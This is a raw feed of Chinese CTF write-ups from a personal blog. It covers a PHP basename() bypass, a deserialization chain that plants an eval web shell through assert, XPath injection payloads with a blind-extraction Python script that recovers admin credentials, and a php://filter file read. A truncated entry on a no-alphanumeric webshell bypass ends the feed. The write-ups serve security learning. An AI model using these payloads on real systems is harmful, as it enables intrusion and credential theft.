<code>config.php</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$url1</span> = <span class="string">&quot;testpath/index.php&quot;</span>;</span><br><span class="line">     <span class="comment">// 返回index.php</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$url2</span> = <span class="string">&quot;testpath/index.php&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%D1%A7%CF&#x27;</span>); </span><br><span class="line">    <span class="comment">// 返回index.php和乱码</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$url3</span> = <span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%D1%A7%CF%B0index.php+ &#x27;</span>);</span><br><span class="line">     <span class="comment">// 返回flag，前面的非acsii被删除</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$url4</span> = <span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;index.php%D1%A7%CF%B0 &#x27;</span>); </span><br><span class="line">    <span class="comment">// 返回flag和后面的非ascii</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$url1</span>) .<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$url2</span>) .<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$url3</span>) .<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$url4</span>) .<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>Payload1</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">http</div></div><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/index.php/config.php/任意中文?source</span><br></pre></td></tr></table></figure></div><p>以及大佬的fuzz思路</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">255</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$str</span>=<span class="string">&quot;/index.php/config.php/&quot;</span>.<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">check</span>(<span class="variable">$str</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$i</span>.<span class="string">&quot;：&quot;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$str</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>Payload2</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">http</div></div><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/index.php/config.php/%80?source</span><br></pre></td></tr></table></figure></div><p>参考很多大佬的思路<br><a href="https://blog.csdn.net/qq_58784379/article/details/121742710">sGanYu(Zer0pts2020)basename函数漏洞</a><br><a href="https://blog.csdn.net/rfrder/article/details/110929280">bfengj(Zer0pts2020)Can you guess it?的WP</a></p><hr><h1 id="叨逼几句"><a href="#叨逼几句" class="headerlink" title="叨逼几句"></a>叨逼几句</h1><p>很久没做题了，摸了太久了，的确自己生疏了很多，2021年确实很多事情不怎么顺，希望新的一年能好一些吧</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\yakko117\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\yakko117\assets\js\A</summary>
      
    
    
    
    <category term="做题笔记" scheme="https://manayakko.github.io/yakko117/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="writeup" scheme="https://manayakko.github.io/yakko117/tags/writeup/"/>
    
    <category term="ctf" scheme="https://manayakko.github.io/yakko117/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Ha1cyonCTF2020-公开赛</title>
    <link href="https://manayakko.github.io/yakko117/2020/04/18/NPUCTF2020/"/>
    <id>https://manayakko.github.io/yakko117/2020/04/18/NPUCTF2020/</id>
    <published>2020-04-18T00:59:02.917Z</published>
    <updated>2023-04-18T21:45:59.739Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>复现学习，还是学习到很多东西的</p><h1 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020] ReadlezPHP"></a>[NPUCTF2020] ReadlezPHP</h1><p>F12 源码看到 <code>/time.php?source</code><br>简单的链子，序列化对象 <code>assert</code> 传马</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">HelloPhp</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$h</span> = <span class="keyword">new</span> <span class="title class_">HelloPhp</span>;</span><br><span class="line"><span class="variable">$h</span>-&gt;a = <span class="string">&#x27;file_put_contents(&quot;yakko.php&quot;, &quot;&lt;?php eval(\$_REQUEST[\&#x27;cmd\&#x27;]); ?&gt;&quot;)&#x27;</span>;</span><br><span class="line"><span class="variable">$h</span>-&gt;b = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line"><span class="comment">//eval($h-&gt;a);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$h</span>));</span><br><span class="line">@<span class="variable">$ppp</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$h</span>));</span><br></pre></td></tr></table></figure></div><p>Payload:<br><code>time.php?O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A67%3A%22file_put_contents%28%22yakko.php%22%2C+%22%3C%3Fphp+eval%28%5C%24_REQUEST%5B%27cmd%27%5D%29%3B+%3F%3E%22%29%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22assert%22%3B%7D</code></p><p>然后蚁剑 绕过 <code>disable_fuction</code>, Payload <code>echo $FLAG</code></p><hr><h1 id="NPUCTF2020-ezlogin"><a href="#NPUCTF2020-ezlogin" class="headerlink" title="[NPUCTF2020] ezlogin"></a>[NPUCTF2020] ezlogin</h1><p><a href="https://www.cnblogs.com/W4nder/p/12747742.html">https://www.cnblogs.com/W4nder/p/12747742.html</a><br><a href="https://shimo.im/docs/6hyIjGkLoRc43JRs/read">https://shimo.im/docs/6hyIjGkLoRc43JRs/read</a></p><p>登陆页面如下<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ha1cyon_login_1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ha1cyon_login_1.png" class="lazyload"></a></p><p>查看源码，在 <code>static/main.js</code> 发现关键点</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doLogin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> username = $(<span class="string">&quot;#username&quot;</span>).<span class="title function_ invoke__">val</span>();</span><br><span class="line">  <span class="keyword">var</span> password = $(<span class="string">&quot;#password&quot;</span>).<span class="title function_ invoke__">val</span>();</span><br><span class="line">  <span class="keyword">var</span> token = $(<span class="string">&quot;#token&quot;</span>).<span class="title function_ invoke__">val</span>();</span><br><span class="line">  <span class="keyword">if</span>(username == <span class="string">&quot;&quot;</span> || password == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">    $(<span class="string">&quot;.msg&quot;</span>).<span class="title function_ invoke__">text</span>(<span class="string">&quot;用户名和密码不能为空!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">var</span> data = <span class="string">&quot;&lt;username&gt;&quot;</span>+username+<span class="string">&quot;&lt;/username&gt;&quot;</span>+<span class="string">&quot;&lt;password&gt;&quot;</span>+password+<span class="string">&quot;&lt;/password&gt;&quot;</span>+<span class="string">&quot;&lt;token&gt;&quot;</span>+token+<span class="string">&quot;&lt;/token&gt;&quot;</span>; </span><br><span class="line">    $.<span class="title function_ invoke__">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&quot;login.php&quot;</span>,</span><br><span class="line">        <span class="attr">contentType</span>: <span class="string">&quot;application/xml&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>: data,</span><br><span class="line">        <span class="attr">anysc</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">success</span>: function (result, status, xhr) &#123;</span><br><span class="line">          <span class="keyword">if</span>(result == <span class="string">&#x27;成功&#x27;</span>)&#123;</span><br><span class="line">            window.location.href = <span class="string">&#x27;admin.php&#x27;</span>;  </span><br><span class="line">          &#125;</span><br><span class="line">          $(<span class="string">&quot;.msg&quot;</span>).<span class="title function_ invoke__">text</span>(result);</span><br><span class="line">          </span><br><span class="line">        &#125;,</span><br><span class="line">        error: <span class="function"><span class="keyword">function</span> (<span class="params">XMLHttpRequest,textStatus,errorThrown</span>) </span>&#123;</span><br><span class="line">            $(<span class="string">&quot;.msg&quot;</span>).<span class="title function_ invoke__">text</span>(errorThrown + <span class="string">&#x27;:&#x27;</span> + textStatus);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>看到熟悉的xml，一开始以为是XXE，（然后站被日了 &#x3D; &#x3D;<br>后来复现的时候，知道是 <a href="https://www.cnblogs.com/backlion/p/8554749.html">Xpath注入</a></p><h2 id="注入与绕过"><a href="#注入与绕过" class="headerlink" title="注入与绕过"></a>注入与绕过</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$query <span class="operator">=</span> &quot;/root/accounts/user[username/text()=&#x27;&quot;.$name.&quot;&#x27; and password/text()=&#x27;&quot;.$pwd.&quot;&#x27;]&quot;;</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>万能密码，这点和<span class="keyword">SQL</span>很像；在知道用户名的情况：</span><br><span class="line">?name<span class="operator">=</span>admin<span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="operator">&amp;</span>pwd<span class="operator">=</span>fake</span><br><span class="line"></span><br><span class="line">在不知道用户名的情况，使用两个<span class="keyword">or</span>绕过：</span><br><span class="line">?name<span class="operator">=</span>fake<span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;or&#x27;</span><span class="number">1</span><span class="operator">&amp;</span>pwd<span class="operator">=</span>fake</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>使用<span class="operator">|</span>操作符，</span><br><span class="line">?name<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;]|//*|ss[&#x27;</span><span class="operator">&amp;</span>pwd<span class="operator">=</span>fake</span><br></pre></td></tr></table></figure></div><p>其执行的语句为：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>root<span class="operator">/</span>accounts<span class="operator">/</span><span class="keyword">user</span>[username<span class="operator">/</span>text()<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> ]<span class="operator">|</span><span class="operator">/</span><span class="comment">/*|ss[&#x27;&#x27; and password/text()=&#x27;1&#x27;]</span></span><br></pre></td></tr></table></figure></div><p>即先闭合前面的语句，之后列出文档所有元素</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3.</span>盲注，需要一级一级猜解节点；猜解第一级节点：</span><br><span class="line">?name<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or substring(name(/*[position()=1]),1,1)=&#x27;</span>r<span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="operator">&amp;</span>pwd<span class="operator">=</span>fake</span><br></pre></td></tr></table></figure></div><h2 id="然后是注入-大佬的exp"><a href="#然后是注入-大佬的exp" class="headerlink" title="然后是注入## 大佬的exp"></a>然后是注入<br><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">猜解第二级节点数量：</span><br><span class="line">?name<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or count(/root/*)=2 or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="operator">&amp;</span>fake</span><br><span class="line"></span><br><span class="line">猜解第二级节点：</span><br><span class="line">?name<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or substring(name(/root/*[position()=1]),1,1)=&#x27;</span>u<span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="operator">&amp;</span>pwd<span class="operator">=</span>fake</span><br><span class="line"></span><br><span class="line">猜解id为<span class="number">1</span>的<span class="keyword">user</span>节点下的username值：</span><br><span class="line">?name<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or substring(/root/users/user[id=1]/username,1,1)=&#x27;</span>a<span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="operator">&amp;</span>pwd<span class="operator">=</span>fake</span><br></pre></td></tr></table></figure></div><br>## 大佬的exp<br><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://buuoj-test.cn/&#x27;</span></span><br><span class="line">sess=requests.session()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">token</span>():</span><br><span class="line">    req=sess.get(url)</span><br><span class="line">    tok=re.findall(<span class="string">&#x27;&lt;input type=&quot;hidden&quot; id=&quot;token&quot; value=&quot;(.*)&quot; /&gt;&#x27;</span>,req.text)</span><br><span class="line">    <span class="keyword">return</span> tok[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">username,password</span>):</span><br><span class="line">    data=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;username&gt;&#123;&#125;&lt;/username&gt;&lt;password&gt;&#123;&#125;&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(username,password,token())</span><br><span class="line"></span><br><span class="line">    req=sess.post(url+<span class="string">&#x27;login.php&#x27;</span>,data=data,headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/xml&#x27;</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span>(req.text,req.status_code)</span><br><span class="line">    <span class="keyword">return</span> req</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># root</span></span><br><span class="line">payload=<span class="string">&quot;&#x27; or  substring(name(/*[position()=1]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;  or &#x27;1&#x27; = &#x27;1&quot;</span></span><br><span class="line">ro=<span class="string">&#x27;root&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;&#x27; or substring(name(/root/*[position()=1]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;  or &#x27;1&#x27; = &#x27;1&quot;</span></span><br><span class="line">ro=<span class="string">&#x27;accounts&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;&#x27; or substring(name(/root/accounts/*[position()=1]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;  or &#x27;1&#x27; = &#x27;1&quot;</span></span><br><span class="line">ro=<span class="string">&#x27;user&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;&#x27; or substring(name(/root/accounts/user/*[position()=2]),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;  or &#x27;1&#x27; = &#x27;1&quot;</span></span><br><span class="line"><span class="comment"># id username password</span></span><br><span class="line">ro=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;1&#x27; or substring(/root/accounts/user[id=2]/username,&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line"><span class="comment"># guest adm1n</span></span><br><span class="line">ro=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;1&#x27; or substring(/root/accounts/user[id=2]/password,&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; or &#x27;1&#x27;=&#x27;1&quot;</span></span><br><span class="line"><span class="comment">#cf7414b5bdb2e65ee43083f4ddbc4d9f gtfly123</span></span><br><span class="line">ro=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string.digits+string.ascii_letters+<span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> j==<span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;***************false&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        tmp=payload.<span class="built_in">format</span>(i,j)</span><br><span class="line"></span><br><span class="line">        req=login(tmp,<span class="string">&#x27;ad&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;非法操作&#x27;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            ro+=j</span><br><span class="line">            <span class="built_in">print</span>(ro)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div></h2><p>得到 <code>adm1n cf7414b5bdb2e65ee43083f4ddbc4d9f</code><br>md5解密 gtfly123</p><p>登陆成功后，看到URL为 <code>admin.php?file=welcome</code><br>查看源码，看到有 <code>base64</code> 加密后的 <code>flag is in /flag</code><br>说明还考查文件包含，用伪协议打，测了一下，大概有几个过滤 <code>php read base64</code><br>也还是简单，大小写绕过</p><p><code>/admin.php?file=Php://filter/Read=convert.Base64-encode/resource=/flag</code></p><hr><p>后面的一些题目先摸了，有空再来看了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\yakko117\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\yakko117\assets\js\A</summary>
      
    
    
    
    <category term="做题笔记" scheme="https://manayakko.github.io/yakko117/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="writeup" scheme="https://manayakko.github.io/yakko117/tags/writeup/"/>
    
    <category term="ctf" scheme="https://manayakko.github.io/yakko117/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>无数字字母绕过 Bypass</title>
    <link href="https://manayakko.github.io/yakko117/2020/04/16/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E7%BB%95%E8%BF%87webshell/"/>
    <id>https://manayakko.github.io/yakko117/2020/04/16/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E7%BB%95%E8%BF%87webshell/</id>
    <published>2020-04-16T03:08:09.874Z</published>
    <updated>2020-04-16T03:08:01.477Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>很久以前做过安恒的题，最近遇到个差不多，来记录一下学习笔记<br>利用思路提出来自P神<a href="https://www.leavesongs.com/penetration/webshell-without-alphanum.html">一些不包含数字和字母的 webshell</a></p><h1 id="漏洞核心"><a href="#漏洞核心" class="headerlink" title="漏洞核心"></a>漏洞核心</h1><ul><li>异或绕过 Bypass</li><li>取反绕过</li><li>不用数字构造出数字( 弱类型 <code>true 值为 1</code> -&gt; <code>true + true == 2</code> )</li></ul><h1 id="安恒的题型和变种"><a href="#安恒的题型和变种" class="headerlink" title="安恒的题型和变种"></a>安恒的题型和变种</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    